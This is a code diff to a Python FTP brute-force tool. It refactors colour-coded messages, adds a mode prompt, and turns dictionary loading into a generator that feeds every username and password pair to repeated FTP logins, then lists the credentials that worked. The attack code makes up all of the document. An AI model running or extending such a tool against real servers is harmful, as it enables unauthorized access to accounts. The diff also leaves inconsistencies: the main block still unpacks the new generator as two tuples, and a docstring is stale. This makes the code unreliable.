@@ -30,12 +30,21 @@ class FtpBruteForce:
         self.server_port = server_port
 
     @staticmethod
-    def error_message(message: str):
+    def display_message(message: str, color: str = "red"):
         """
         :param message: Information to be displayed.(String)
+        :param color: Specifies the color of the displayed message, which defaults to red.
         """
         try:
-            print(f"\033[1;31m{message}\033[0m")  # Mark the message in red font
+            match color:
+                case "red":
+                    print(f"\033[1;31m{message}\033[0m")
+                case "green":
+                    print(f"\033[1;32m{message}\033[0m")
+                case "yellow":
+                    print(f"\033[1;33m{message}\033[0m")
+                case _:
+                    print(message)
         except ValueError:
             print("The data type must be 'str'.")
 
@@ -65,6 +74,28 @@ class FtpBruteForce:
             # Try reconnecting regardless of whether the connection has been disconnected or not.
             if not connection:
                 self.ftp.connect(self.server_address, self.server_port, timeout=10)
+                self.ftp.set_pasv(True)
+
+    def get_mode(self) -> int:
+        """
+        :return: mode number.(int)
+        """
+        while True:
+            # Blasting mode selection.
+            try:
+                mode = int(input("""1. Try all usernames and dictionaries in the dictionary
+2. Single blasting\n0. Exit\nPlease enter login mode:"""))
+                match mode:
+                    case 0:
+                        exit(0)
+                    case 1 | 2:
+                        return mode
+                    case _:
+                        self.display_message("The login mode entered is invalid. Please enter 1 or 2.")
+                        continue
+            except ValueError:
+                self.display_message("The login mode entered is invalid. Please enter 1 or 2.")
+                continue
 
     def load_dict(self):
         """
@@ -72,32 +103,27 @@ class FtpBruteForce:
                  return (None, None) if the file does not exist.
         """
         # Using collections to eliminate duplicates.
-        user_set = set()
-        password_set = set()
+        # user_set = set()
+        # password_set = set()
         # Check if the dictionary file exists, and continue importing the dictionary if it exists.
         if path.exists(self.user_dict_path) and path.exists(self.password_dict_path):
             # Import username dictionary.
-            with open(self.user_dict_path, "r") as user_file:
-                for user in user_file:
-                    user = user.strip()
-                    if user != "":
-                        user_set.add(user)
-            # Import password dictionary.
-            with open(self.password_dict_path, "r") as password_file:
-                for password in password_file:
-                    password = password.strip()
-                    if password != "":
-                        password_set.add(password)
-        else:
-            self.error_message("Dictionary file does not exist!")
-            return None, None
+            with open(file=self.user_dict_path, mode="r", encoding="utf-8") as user_file:
+                users = [line.strip() for line in user_file if line.strip()]
+            with open(file=self.password_dict_path, mode="r", encoding="utf-8") as password_file:
+                passwords = [line.strip() for line in password_file if line.strip()]
+            for user in users:
+                for password in passwords:
+                    yield user, password
 
-        return tuple(user_set), tuple(password_set)
+        else:
+            self.display_message("Dictionary file does not exist!")
+            return None, None
 
     def connection(self):
         while True:
             if self.attempted_times == 5:
-                self.error_message("""Failed to connect five times, attempting to reconnect,
+                self.display_message("""Failed to connect five times, attempting to reconnect,
 please wait at least 5 seconds""")
                 self.stop(self.attempted_times)
                 self.reconnect(connection=True)
@@ -105,101 +131,75 @@ please wait at least 5 seconds""")
                 try:
                     reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
                     if "220" in reply:
-                        print("\033[32mConnection successful, FTP service ready!\033[0m")
+                        self.display_message("\033[32mConnection successful, FTP service ready!\033[0m", color="green")
+                        self.ftp.set_pasv(True)
                         break
                 except ConnectionRefusedError as connect_error:
                     self.attempted_times += 1
-                    self.error_message(f"""Error:{connect_error},the connection was denied,
+                    self.display_message(f"""Error:{connect_error},the connection was denied,
 the service may not be running or the maximum number of connections may have been reached.""")
                     continue
                 except (TimeoutError, timeout) as timeout_error:
                     self.attempted_times += 1
-                    self.error_message(f"""Error:{timeout_error},Connection timeout,
+                    self.display_message(f"""Error:{timeout_error},Connection timeout,
 please check if the network connection and FTP server are functioning properly.""")
                     continue
 
         self.attempted_times = 0  # Reset counter.
 
-    def brute(self, user_dict_tuples, password_tuples):
+    def brute(self):
         """
         :param user_dict_tuples: Username dictionary tuple.
         :param password_tuples: Password dictionary tuple.
         """
         success_login: dict = dict()
+        mode = self.get_mode()
 
-        if len(user_dict_tuples) == 0 or len(password_tuples) == 0:
-            self.error_message("""The username dictionary or password dictionary is empty.
-Please first call the load-dict method to load the username and password dictionary.""")
-            exit(1)
-        else:
-            while True:
-                mode = None
-                # Blasting mode selection.
+        for user, password in self.load_dict():
+            self.attempted_times = 0
+
+            while self.attempted_times < 6:
                 try:
-                    mode = int(input("""1. Try all usernames and dictionaries in the dictionary
-2. Single blasting\n0. Exit\nPlease enter login mode:"""))
-                    match mode:
-                        case 0:
-                            exit(0)
-                        case 1 | 2:
-                            break
-                        case _:
-                            self.error_message("The login mode entered is invalid. Please enter 1 or 2.")
-                            continue
-                except ValueError:
-                    self.error_message("The login mode entered is invalid. Please enter 1 or 2.")
-                    continue
-
-            for user in user_dict_tuples:
-                for password_index, password in enumerate(password_tuples):
-                    self.attempted_times = 0
-
-                    while self.attempted_times < 6:
-                        try:
-                            replay = self.ftp.login(user, password)
-                            if "230" in replay and mode == 1:
-                                print(f"\033[1;32mLogin successful! user:{user}, password:{password}\033[0m")
-                                success_login[user] = password
-                                self.ftp.close()
-                                self.connection()
-                                break
-                            elif "230" in replay and mode == 2:
-                                print(f"\033[1;32mLogin successful! user:{user}, password:{password}\033[0m")
-                                self.ftp.close()
-                                exit(0)
-                        except error_perm as error:
-                            if "530 Permission denied" in str(error):
-                                self.error_message(f"user:{user} password:{password} Login failed, access denied!")
-                                break
-                            elif "530 Login incorrect" in str(error):
-                                self.error_message(f"user:{user} password:{password} Login failed!")
-                                break
-                            else:
-                                pass
-                        except (TimeoutError, BrokenPipeError):
-                            self.error_message(f"user:{user} password:{password} Login timeout!")
-                            self.attempted_times += 1
-                            if self.attempted_times >= 5:
-                                self.error_message(f"""The current attempt count exceeds the limit,
-and this user password combination will be skipped.""")
-                                break
-                            else:
-                                self.reconnect()
-                                continue
-                        except (EOFError, ConnectionResetError):
-                            self.reconnect()
-                            continue
-
-                    # All passwords of the current user have been tried.
-                    if password_index + 1 < len(password_tuples):
-                        continue
+                    replay = self.ftp.login(user, password)
+                    if "230" in replay and mode == 1:
+                        self.display_message(f"Login successful! user:{user}, password:{password}", color="green")
+                        success_login[user] = password
+                        self.ftp.close()
+                        self.connection()
+                        break
+                    elif "230" in replay and mode == 2:
+                        self.display_message(f"Login successful! user:{user}, password:{password}", color="green")
+                        self.ftp.close()
+                        exit(0)
+                except error_perm as error:
+                    if "530 Permission denied" in str(error):
+                        self.display_message(f"user:{user} password:{password} Login failed, access denied!")
+                        break
+                    elif "530 Login incorrect" in str(error):
+                        self.display_message(f"user:{user} password:{password} Login failed!")
+                        break
+                    elif "530 User cannot log in" in str(error):
+                        self.display_message(f"user:{user} password:{password} Login failed, user cannot log in!")
+                        break
                     else:
-                        self.error_message("""The current user and password combination attempt has been completed,
-but no valid login information was found.""")
+                        pass
+                except (TimeoutError, BrokenPipeError):
+                    self.display_message(f"user:{user} password:{password} Login timeout!")
+                    self.attempted_times += 1
+                    if self.attempted_times >= 5:
+                        self.display_message(f"""The current attempt count exceeds the limit,
+and this user password combination will be skipped.""")
+                        break
+                    else:
+                        self.reconnect()
+                        continue
+                except ConnectionResetError:
+                    self.reconnect()
+                    continue
 
         print("The following are valid login information:")
         for key, value in success_login.items():
-            print(f"user:{key} password:{value}")
+            self.display_message(message=f"user:{key} password:{value}", color="yellow")
 
     def __del__(self):
         self.ftp.close()
@@ -233,4 +233,4 @@ if __name__ == '__main__':
                         password_dict_path=args["password"])
     user_tuple, password_tuple = fbf.load_dict()
     fbf.connection()
-    fbf.brute(user_tuple, password_tuple)
+    fbf.brute()
